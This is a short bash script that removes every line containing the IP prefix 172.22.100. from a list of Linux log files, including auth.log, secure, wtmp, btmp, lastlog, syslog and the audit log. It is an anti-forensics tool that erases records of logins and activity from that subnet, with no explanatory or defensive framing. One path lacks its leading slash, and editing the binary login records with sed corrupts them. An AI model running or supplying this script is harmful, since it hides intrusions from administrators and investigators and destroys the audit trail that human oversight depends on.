#!/bin/bash

ip="172.22.100."

to_clean_list=(
	"/var/log/auth.log"
	"/var/log/secure"
	"/var/log/wtmp"
	"/var/log/btmp"
	"/var/log/lastlog"
	"/var/log/faillog"
	"/var/log/syslog"
	"/var/log/kern.log"
	"/var/log/debug"
	"/var/log/messages"
	"/var/log/daemon.log"
	"var/log/audit/audit.log"
)

sed -i "/$ip/d" "${to_clean_list[@]}"